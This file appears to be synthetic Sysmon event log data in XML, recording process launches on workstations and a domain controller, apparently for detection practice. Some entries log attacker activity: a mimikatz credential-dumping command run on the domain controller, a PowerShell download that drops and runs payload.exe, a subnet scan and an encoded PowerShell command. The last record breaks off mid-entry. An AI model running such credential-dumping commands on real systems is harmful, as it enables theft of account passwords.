<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:17:30.0000000Z" />
    <EventRecordID>16</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS09</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:17:30.000</Data>
    <Data Name="ProcessGuid">{bf544db1-2a0f-4dd3-913a-761e45418025}</Data>
    <Data Name="ProcessId">10016</Data>
    <Data Name="Image">C:\Users\Public\toolkit.exe</Data>
    <Data Name="CommandLine">toolkit.exe</Data>
    <Data Name="CurrentDirectory">C:\Users\Public\</Data>
    <Data Name="User">CORP\dking</Data>
    <Data Name="ParentProcessGuid">{dba9e027-12c6-4508-a1a5-34edaaa3d7b9}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:19:30.0000000Z" />
    <EventRecordID>17</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-DC01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:19:30.000</Data>
    <Data Name="ProcessGuid">{3e7a3fed-f99f-47b1-b41c-5f31e36f4902}</Data>
    <Data Name="ProcessId">10017</Data>
    <Data Name="Image">C:\Windows\Temp\mimikatz.exe</Data>
    <Data Name="CommandLine">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"</Data>
    <Data Name="CurrentDirectory">C:\Windows\Temp\</Data>
    <Data Name="User">SYSTEM</Data>
    <Data Name="ParentProcessGuid">{541573e4-1ec0-43c9-bf0a-d568d60ce8f7}</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:20:30.0000000Z" />
    <EventRecordID>18</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-DC01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:20:30.000</Data>
    <Data Name="ProcessGuid">{ea33e8aa-a692-4ef3-9bec-b9eefa65d661}</Data>
    <Data Name="ProcessId">10018</Data>
    <Data Name="Image">C:\Windows\System32\smss.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">SYSTEM</Data>
    <Data Name="ParentProcessGuid">{cb91c9e5-880e-4707-8041-c9ec266b9f96}</Data>
    <Data Name="ParentImage">System</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:20:32.0000000Z" />
    <EventRecordID>19</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-DC01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:20:32.000</Data>
    <Data Name="ProcessGuid">{1371efd3-b9c8-4c42-93f8-028c7b0a29ef}</Data>
    <Data Name="ProcessId">10019</Data>
    <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">SYSTEM</Data>
    <Data Name="ParentProcessGuid">{ea33e8aa-a692-4ef3-9bec-b9eefa65d661}</Data>
    <Data Name="ParentImage">C:\Windows\System32\smss.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:21:32.0000000Z" />
    <EventRecordID>20</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-DC01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:21:32.000</Data>
    <Data Name="ProcessGuid">{e5f026b7-b602-4bfc-a97c-f61742047996}</Data>
    <Data Name="ProcessId">10020</Data>
    <Data Name="Image">C:\Windows\System32\wininit.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">SYSTEM</Data>
    <Data Name="ParentProcessGuid">{ba52961f-eeef-45ca-ae12-d089f7b045c3}</Data>
    <Data Name="ParentImage">C:\Windows\System32\smss.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:21:34.0000000Z" />
    <EventRecordID>21</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-DC01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:21:34.000</Data>
    <Data Name="ProcessGuid">{e04a002f-2681-4f68-a71f-8a1350bb635a}</Data>
    <Data Name="ProcessId">10021</Data>
    <Data Name="Image">C:\Windows\System32\services.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Windows\System32\</Data>
    <Data Name="User">SYSTEM</Data>
    <Data Name="ParentProcessGuid">{e5f026b7-b602-4bfc-a97c-f61742047996}</Data>
    <Data Name="ParentImage">C:\Windows\System32\wininit.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:23:34.0000000Z" />
    <EventRecordID>22</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS10</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:23:34.000</Data>
    <Data Name="ProcessGuid">{26ae891a-aaa6-48a0-9734-aa8755ce88db}</Data>
    <Data Name="ProcessId">10022</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell -c downloadfile</Data>
    <Data Name="CurrentDirectory">C:\Users\emartin\</Data>
    <Data Name="User">CORP\emartin</Data>
    <Data Name="ParentProcessGuid">{69315242-2619-4bfc-ad10-8268ce8e6c0b}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>11</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:23:54.0000000Z" />
    <EventRecordID>23</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS10</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:23:54.000</Data>
    <Data Name="ProcessGuid">{26ae891a-aaa6-48a0-9734-aa8755ce88db}</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="TargetFilename">C:\Users\emartin\AppData\Local\Temp\payload.exe</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:24:39.0000000Z" />
    <EventRecordID>24</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS10</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:24:39.000</Data>
    <Data Name="ProcessGuid">{9f4dae4b-22ee-4730-84fb-25dd9e8e15f8}</Data>
    <Data Name="ProcessId">10024</Data>
    <Data Name="Image">C:\Users\emartin\AppData\Local\Temp\payload.exe</Data>
    <Data Name="CommandLine">payload.exe</Data>
    <Data Name="CurrentDirectory">C:\Users\emartin\AppData\Local\Temp\</Data>
    <Data Name="User">CORP\emartin</Data>
    <Data Name="ParentProcessGuid">{0bbe12f9-162e-440f-b476-827543312f87}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:26:39.0000000Z" />
    <EventRecordID>25</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS11</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:26:39.000</Data>
    <Data Name="ProcessGuid">{ca929682-5643-4ad8-b8fb-39dda940eb68}</Data>
    <Data Name="ProcessId">10025</Data>
    <Data Name="Image">\\fileserver01\shared\tools\netscan.exe</Data>
    <Data Name="CommandLine">netscan.exe -scan 192.168.1.0/24</Data>
    <Data Name="CurrentDirectory">\\fileserver01\shared\tools\</Data>
    <Data Name="User">CORP\fowen</Data>
    <Data Name="ParentProcessGuid">{dcda2897-3821-45a0-8d35-2970acc74521}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:27:39.0000000Z" />
    <EventRecordID>26</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS12</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:27:39.000</Data>
    <Data Name="ProcessGuid">{05651c8b-2df9-43f1-8f7b-199cf01030f7}</Data>
    <Data Name="ProcessId">10026</Data>
    <Data Name="Image">D:\portable_apps\suspicious_tool.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">D:\portable_apps\</Data>
    <Data Name="User">CORP\gtan</Data>
    <Data Name="ParentProcessGuid">{0b1a3dfb-b129-411e-a87b-ea105ab57cd5}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:29:39.0000000Z" />
    <EventRecordID>27</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:29:39.000</Data>
    <Data Name="ProcessGuid">{a85a2534-254e-4387-a94b-0243fce0cee7}</Data>
    <Data Name="ProcessId">10027</Data>
    <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
    <Data Name="User">CORP\jdoe</Data>
    <Data Name="ParentProcessGuid">{dd1b0661-ba1e-48b2-be0c-71582786dfc6}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:31:39.0000000Z" />
    <EventRecordID>28</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS02</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:31:39.000</Data>
    <Data Name="ProcessGuid">{26ec6c10-ea3d-4692-b974-6a66c2f3c025}</Data>
    <Data Name="ProcessId">10028</Data>
    <Data Name="Image">C:\Windows\System32\notepad.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
    <Data Name="User">CORP\ksmith</Data>
    <Data Name="ParentProcessGuid">{b3fdc95c-bd3a-4748-9659-63389c35b2f6}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:33:39.0000000Z" />
    <EventRecordID>29</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS03</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:33:39.000</Data>
    <Data Name="ProcessGuid">{658d8c2e-f115-4a26-aa40-b12bd0895470}</Data>
    <Data Name="ProcessId">10029</Data>
    <Data Name="Image">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
    <Data Name="User">CORP\mwilson</Data>
    <Data Name="ParentProcessGuid">{c0e3d707-0e67-46cd-b1cf-69292966b319}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:35:39.0000000Z" />
    <EventRecordID>30</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS03</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:35:39.000</Data>
    <Data Name="ProcessGuid">{702f295a-0982-4f82-b79f-da2e74b46ee4}</Data>
    <Data Name="ProcessId">10030</Data>
    <Data Name="Image">C:\Windows\System32\ipconfig.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
    <Data Name="User">CORP\mwilson</Data>
    <Data Name="ParentProcessGuid">{05666f35-7916-48b8-9805-ad3e084892f3}</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:37:39.0000000Z" />
    <EventRecordID>31</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS04</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:37:39.000</Data>
    <Data Name="ProcessGuid">{8ab2832e-0dbd-4220-8744-6478c0432c0a}</Data>
    <Data Name="ProcessId">10031</Data>
    <Data Name="Image">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
    <Data Name="User">CORP\tlee</Data>
    <Data Name="ParentProcessGuid">{c0baf8ef-314a-4715-81ca-abd47b0f15ff}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:39:39.0000000Z" />
    <EventRecordID>32</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-DC01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:39:39.000</Data>
    <Data Name="ProcessGuid">{bbdb352c-3c48-4feb-b218-e0407c43523e}</Data>
    <Data Name="ProcessId">10032</Data>
    <Data Name="Image">C:\Windows\System32\svchost.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
    <Data Name="User">SYSTEM</Data>
    <Data Name="ParentProcessGuid">{b73da8a7-cdc7-49ae-8bcd-5899bd8fa0b1}</Data>
    <Data Name="ParentImage">C:\Windows\System32\services.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:41:39.0000000Z" />
    <EventRecordID>33</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS05</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:41:39.000</Data>
    <Data Name="ProcessGuid">{51abf073-c7b4-4399-a89a-6d387f77f7ef}</Data>
    <Data Name="ProcessId">10033</Data>
    <Data Name="Image">C:\Windows\System32\taskhostw.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
    <Data Name="User">CORP\pgomez</Data>
    <Data Name="ParentProcessGuid">{86fa1fa1-109d-4052-82ce-78a80797e09c}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:43:39.0000000Z" />
    <EventRecordID>34</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS06</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:43:39.000</Data>
    <Data Name="ProcessGuid">{39c67e26-2b5d-44df-8bba-712314e0db6b}</Data>
    <Data Name="ProcessId">10034</Data>
    <Data Name="Image">C:\Program Files\Mozilla Firefox\firefox.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
    <Data Name="User">CORP\swhite</Data>
    <Data Name="ParentProcessGuid">{24dd0592-cd6a-423a-afe5-4f77a5eab585}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-03T09:45:39.0000000Z" />
    <EventRecordID>35</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS07</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-03 09:45:39.000</Data>
    <Data Name="ProcessGuid">{567505c5-b4d9-4af9-8842-feb62daf9ce9}</Data>
    <Data Name="ProcessId">10035</Data>
    <Data Name="Image">C:\Windows\System32\calc.exe</Data>
    <Data Name="CommandLine" />
    <Data Name="CurrentDirectory">C:\Users\Default\</Data>
    <Data Name="User">CORP\bwong</Data>
    <Data Name="ParentProcessGuid">{d37d8a33-c821-46b8-a7c4-fec15261160e}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:01:00.0000000Z" />
    <EventRecordID>1</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:01:00.000</Data>
    <Data Name="ProcessGuid">{3fb55176-73a3-4bc6-9ec0-aeed482c2d5a}</Data>
    <Data Name="ProcessId">10001</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA</Data>
    <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
    <Data Name="User">CORP\jdoe</Data>
    <Data Name="ParentProcessGuid">{f2903f6a-05a2-4dcf-9fe9-b16606a8b1b6}</Data>
    <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
    <Data Name="ParentCommandLine" />
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:02:00.0000000Z" />
    <EventRecordID>2</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS02</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:02:00.000</Data>
    <Data Name="ProcessGuid">{ebb1c1b9-3a83-45ab-b694-5a1c896071a9}</Data>
    <Data Name="ProcessId">10002</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -WindowStyle Hidden -Command Get-Process</Data>
    <Data Name="CurrentDirectory">C:\Users\ksmith\</Data>
    <Data Name="User">CORP\ksmith</Data>
    <Data Name="ParentProcessGuid">{ac88d8fb-3d14-4bc6-b99c-6452d9c5fedb}</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
    <Data Name="ParentCommandLine">cmd.exe</Data>
  </EventData>
</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>1</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-02-10T10:03:00.0000000Z" />
    <EventRecordID>3</EventRecordID>
    <Correlation />
    <Execution ProcessID="600" ThreadID="700" />
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WIN-WKS03</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="UtcTime">2026-02-10 10:03:00.000</Data>
